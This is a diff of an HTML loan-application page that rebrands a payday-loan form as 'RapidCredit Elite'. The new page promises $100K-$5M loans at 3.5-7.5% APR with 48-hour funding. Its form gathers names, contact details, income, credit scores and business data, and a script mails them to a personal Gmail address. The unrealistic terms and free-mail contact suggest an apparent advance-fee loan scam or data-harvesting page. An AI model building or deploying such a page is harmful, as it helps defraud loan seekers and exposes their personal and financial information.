+                        <h3>Business Information</h3>
+                    </div>
+                    
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label class="form-label">Company Name</label>
+                            <input type="text" class="form-input" name="company_name" placeholder="Your company name">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Industry</label>
+                            <select class="form-input form-select" name="industry">
+                                <option value="">Select Industry</option>
+                                <option value="real-estate">Real Estate</option>
+                                <option value="tech">Technology</option>
+                                <option value="healthcare">Healthcare</option>
+                                <option value="manufacturing">Manufacturing</option>
+                                <option value="other">Other</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Years in Business</label>
+                            <select class="form-input form-select" name="years_business">
+                                <option value="">Select Years</option>
+                                <option value="1-3">1-3 years</option>
+                                <option value="3-5">3-5 years</option>
+                                <option value="5-10">5-10 years</option>
+                                <option value="10+">10+ years</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Annual Revenue</label>
+                            <select class="form-input form-select" name="annual_revenue">
+                                <option value="">Select Revenue</option>
+                                <option value="100k-500k">$100K - $500K</option>
+                                <option value="500k-1m">$500K - $1M</option>
+                                <option value="1m-5m">$1M - $5M</option>
+                                <option value="5m+">$5M+</option>
+                            </select>
+                        </div>
                     </div>
                     
                     <div class="form-group">
-                        <label class="form-label">Months with Bank <span>*</span></label>
-                        <select class="form-input form-select" name="bank_months" required>
-                            <option value="">Select</option>
-                            <option value="<6">Less than 6 months</option>
-                            <option value="6-12">6-12 months</option>
-                            <option value="1-2">1-2 years</option>
-                            <option value="2+">More than 2 years</option>
+                        <label class="form-label">Loan Purpose <span>*</span></label>
+                        <select class="form-input form-select" name="loan_purpose" required>
+                            <option value="">Select Purpose</option>
+                            <option value="business-expansion">Business Expansion</option>
+                            <option value="real-estate">Real Estate Investment</option>
+                            <option value="equipment">Equipment Purchase</option>
+                            <option value="inventory">Inventory Financing</option>
+                            <option value="working-capital">Working Capital</option>
+                            <option value="debt-consolidation">Debt Consolidation</option>
+                            <option value="other">Other</option>
                         </select>
                     </div>
                 </div>
 
                 <!-- Terms & Conditions -->
-                <div class="terms-box">
-                    <h4>Important Information:</h4>
-                    <p>By submitting this application, you authorize Rapid Credit to verify the information provided. Loans are subject to credit approval and state regulations. APR ranges from 300% to 400%. Example: $500 loan for 14 days with $75 fee = 391% APR.</p>
-                </div>
-
-                <div class="checkbox-group">
-                    <input type="checkbox" id="terms" required>
-                    <label for="terms">
-                        I have read and agree to the <a href="#">Terms & Conditions</a> and confirm I'm at least 18 years old <span>*</span>
-                    </label>
-                </div>
-
-                <div class="checkbox-group">
-                    <input type="checkbox" id="privacy" required>
-                    <label for="privacy">
-                        I agree to the <a href="#">Privacy Policy</a> and authorize credit checks <span>*</span>
-                    </label>
-                </div>
-
-                <div class="checkbox-group">
-                    <input type="checkbox" id="contact" required>
-                    <label for="contact">
-                        I consent to be contacted at the phone number provided regarding my application <span>*</span>
-                    </label>
+                <div class="terms-section">
+                    <div class="terms-content">
+                        <p><strong>Elite Financing Terms:</strong></p>
+                        <p>• Loan amounts from $100,000 to $5,000,000</p>
+                        <p>• APR rates from 3.5% to 7.5% based on creditworthiness</p>
+                        <p>• Terms from 5 to 10 years available</p>
+                        <p>• No prepayment penalties for qualified applicants</p>
+                        <p>• Funds available within 48 hours of approval</p>
+                        <p>• Strict confidentiality maintained</p>
+                        <p>• All applications subject to credit approval</p>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="terms" required>
+                        <label for="terms">
+                            I have read and agree to the <a href="#">Terms & Conditions</a> and confirm all information provided is accurate <span>*</span>
+                        </label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="privacy" required>
+                        <label for="privacy">
+                            I agree to the <a href="#">Privacy Policy</a> and authorize credit checks <span>*</span>
+                        </label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="contact" required>
+                        <label for="contact">
+                            I consent to be contacted by RapidCredit Elite regarding my application <span>*</span>
+                        </label>
+                    </div>
                 </div>
 
                 <!-- Submit Button -->
-                <button type="submit" class="submit-btn">
-                    <i class="fas fa-paper-plane"></i> SUBMIT APPLICATION
-                </button>
-
-                <div style="text-align: center; margin-top: 20px; color: #6b7280; font-size: 14px;">
-                    <i class="fas fa-shield-alt"></i> Your information is secure & encrypted
+                <div class="submit-section">
+                    <button type="submit" class="elite-submit-btn">
+                        <i class="fas fa-paper-plane"></i> SUBMIT ELITE APPLICATION
+                    </button>
+                    <p style="color: #666; margin-top: 20px; font-size: 14px;">
+                        <i class="fas fa-lock"></i> Secure & Confidential Application
+                    </p>
                 </div>
             </form>
-        </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="elite-footer">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>RapidCredit Elite</h4>
+                    <p style="color: #aaa; line-height: 1.6; margin-top: 15px;">
+                        Premium financing solutions for businesses and high-net-worth individuals.
+                    </p>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>Quick Links</h4>
+                    <ul>
+                        <li><a href="#">Business Loans</a></li>
+                        <li><a href="#">Personal Loans</a></li>
+                        <li><a href="#">Real Estate Financing</a></li>
+                        <li><a href="#">About Us</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="#">Loan Calculator</a></li>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Contact</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>Contact</h4>
+                    <div class="contact-details">
+                        <p><i class="fas fa-phone"></i> +1 (305) 574-1900</p>
+                        <p><i class="fas fa-envelope"></i> kingrollex4@gmail.com</p>
+                        <p><i class="fas fa-clock"></i> Mon-Fri: 9AM-6PM EST</p>
+                        <p><i class="fas fa-building"></i> Premium Financing Division</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                <p>© 2024 RapidCredit Elite. All rights reserved. | Premium Financial Services</p>
+                <p style="margin-top: 10px; font-size: 12px;">Loans subject to credit approval. Not all applicants will qualify.</p>
+            </div>
+        </footer>
     </div>
 
     <script>
-        // Amount Selection
-        document.querySelectorAll('.amount-option').forEach(option => {
-            option.addEventListener('click', function() {
-                document.querySelectorAll('.amount-option').forEach(opt => {
-                    opt.classList.remove('active');
-                });
-                this.classList.add('active');
-                document.getElementById('loanAmount').value = this.dataset.amount;
-                updateProgress(33);
-            });
-        });
-
-        // Update progress bar
-        function updateProgress(percent) {
-            document.getElementById('progressFill').style.width = percent + '%';
+        // Loan Amount Slider
+        const loanSlider = document.getElementById('loanSlider');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const loanAmountInput = document.getElementById('loanAmount');
+        
+        function formatCurrency(amount) {
+            return '$' + amount.toLocaleString('en-US');
         }
-
-        // Form input focus effects
-        document.querySelectorAll('.form-input').forEach(input => {
-            input.addEventListener('focus', function() {
-                this.parentElement.style.transform = 'translateY(-2px)';
-            });
+        
+        loanSlider.addEventListener('input', function() {
+            const value = parseInt(this.value);
+            amountDisplay.textContent = formatCurrency(value);
+            loanAmountInput.value = value;
             
-            input.addEventListener('blur', function() {
-                this.parentElement.style.transform = 'translateY(0)';
+            // Update quick amount buttons
+            document.querySelectorAll('.amount-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (parseInt(btn.dataset.amount) === value) {
+                    btn.classList.add('active');
+                }
             });
         });
-
-        // Form Validation
-        function validateForm() {
-            let isValid = true;
-            const form = document.getElementById('loanApplication');
-            const required = form.querySelectorAll('[required]');
+        
+        // Quick Amount Buttons
+        document.querySelectorAll('.amount-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const amount = parseInt(this.dataset.amount);
+                loanSlider.value = amount;
+                amountDisplay.textContent = formatCurrency(amount);
+                loanAmountInput.value = amount;
+                
+                document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+        
+        // Form Submission
+        function submitEliteApplication(event) {
+            event.preventDefault();
             
-            required.forEach(field => {
+            const form = event.target;
+            const submitBtn = form.querySelector('.elite-submit-btn');
+            const originalText = submitBtn.innerHTML;
+            
+            // Show loading
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING ELITE APPLICATION...';
+            submitBtn.disabled = true;
+            
+            // Validate form
+            let valid = true;
+            form.querySelectorAll('[required]').forEach(field => {
                 if (!field.value.trim()) {
-                    isValid = false;
-                    field.style.borderColor = '#ef4444';
+                    valid = false;
+                    field.style.borderColor = '#ff4757';
                 } else {
                     field.style.borderColor = '';
                 }
             });
             
-            return isValid;
-        }
-
-        // Form Submission
-        function submitApplication(event) {
-            event.preventDefault();
-            
-            // Validate form
-            if (!validateForm()) {
-                alert('Please fill all required fields (*)');
+            if (!valid) {
+                alert('Please complete all required fields (*)');
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
                 return;
             }
             
             // Get form data
-            const form = event.target;
             const formData = new FormData(form);
             const data = Object.fromEntries(formData.entries());
             
-            // Create email content
-            let emailBody = "🚀 RAPID CREDIT - LOAN APPLICATION\n";
-            emailBody += "================================\n\n";
+            // Create elite email content
+            let emailBody = "🚀 RAPIDCREDIT ELITE - PREMIUM LOAN APPLICATION\n";
+            emailBody += "================================================\n\n";
             
-            emailBody += "📋 APPLICATION DETAILS\n";
-            emailBody += `Loan Amount: $${data.loan_amount}\n`;
-            emailBody += `Purpose: ${data.purpose}\n`;
-            emailBody += `Repayment Period: ${data.repayment} days\n\n`;
+            emailBody += "💎 ELITE APPLICATION DETAILS\n";
+            emailBody += `Requested Amount: ${formatCurrency(parseInt(data.loan_amount))}\n`;
+            emailBody += `Purpose: ${data.loan_purpose}\n`;
+            emailBody += `Annual Income: ${data.annual_income}\n`;
+            emailBody += `Credit Score: ${data.credit_score}\n\n`;
             
-            emailBody += "👤 PERSONAL INFORMATION\n";
+            emailBody += "👤 APPLICANT INFORMATION\n";
             emailBody += `Name: ${data.first_name} ${data.last_name}\n`;
             emailBody += `Email: ${data.email}\n`;
-            emailBody += `Phone: ${data.phone}\n`;
-            emailBody += `State: ${data.state}\n`;
-            emailBody += `Monthly Income: ${data.income}\n`;
-            emailBody += `Employment: ${data.employment}\n\n`;
+            emailBody += `Phone: ${data.phone}\n\n`;
             
-            emailBody += "🏦 BANKING INFORMATION\n";
-            emailBody += `Bank Name: ${data.bank_name}\n`;
-            emailBody += `Account Type: ${data.account_type}\n`;
-            emailBody += `Months with Bank: ${data.bank_months}\n\n`;
+            emailBody += "🏢 BUSINESS INFORMATION\n";
+            emailBody += `Company: ${data.company_name || 'N/A'}\n`;
+            emailBody += `Industry: ${data.industry || 'N/A'}\n`;
+            emailBody += `Years in Business: ${data.years_business || 'N/A'}\n`;
+            emailBody += `Annual Revenue: ${data.annual_revenue || 'N/A'}\n\n`;
             
             emailBody += "📊 APPLICATION METADATA\n";
             emailBody += `Submitted: ${new Date().toLocaleString()}\n`;
-            emailBody += `User Agent: ${navigator.userAgent}\n`;
-            emailBody += `Screen: ${window.innerWidth}x${window.innerHeight}\n\n`;
+            emailBody += `IP Address: Fetching...\n`;
+            emailBody += `User Agent: ${navigator.userAgent}\n\n`;
             
-            emailBody += "================================\n";
-            emailBody += "📞 FOLLOW-UP CONTACT\n";
+            emailBody += "================================================\n";
+            emailBody += "📞 ELITE SUPPORT CONTACT\n";
             emailBody += `Phone: +1 (305) 574-1900\n`;
             emailBody += `Email: kingrollex4@gmail.com\n`;
-            emailBody += "Available: 24/7\n";
+            emailBody += `Priority: ELITE APPLICATION - IMMEDIATE FOLLOW-UP REQUIRED\n`;
             
             // Encode for email
-            const subject = encodeURIComponent(`💰 LOAN APP - ${data.first_name} ${data.last_name} - $${data.loan_amount}`);
+            const subject = encodeURIComponent(`🚀 ELITE APPLICATION - ${data.first_name} ${data.last_name} - ${formatCurrency(parseInt(data.loan_amount))}`);
             const body = encodeURIComponent(emailBody);
-            
-            // Show loading
-            const submitBtn = form.querySelector('.submit-btn');
-            const originalText = submitBtn.innerHTML;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
-            submitBtn.disabled = true;
             
             // Open email after 1 second
             setTimeout(() => {
                 window.location.href = `mailto:kingrollex4@gmail.com?subject=${subject}&body=${body}`;
                 
                 // Show success message
-                alert(`✅ APPLICATION READY!\n\nYour email app will open with your completed application.\n\nPlease click "SEND" to submit to Rapid Credit.\n\nWe'll contact you within 24 hours at ${data.phone}`);
+                alert(`✅ ELITE APPLICATION READY!\n\nYour email app will open with your premium application.\n\nClick "SEND" to submit to RapidCredit Elite.\n\nOur elite team will contact you within 2 hours.`);
                 
                 // Reset button
                 submitBtn.innerHTML = originalText;
@@ -801,15 +1053,17 @@
                 // Reset form after 2 seconds
                 setTimeout(() => {
                     form.reset();
-                    document.querySelector('.amount-option[data-amount="300"]').click();
-                    updateProgress(33);
+                    loanSlider.value = 250000;
+                    amountDisplay.textContent = formatCurrency(250000);
+                    loanAmountInput.value = 250000;
+                    document.querySelector('.amount-btn[data-amount="500000"]').click();
                 }, 2000);
                 
             }, 1000);
         }
-
-        // Initialize progress
-        updateProgress(33);
+        
+        // Initialize
+        amountDisplay.textContent = formatCurrency(parseInt(loanSlider.value));
     </script>
 </body>
 </html>
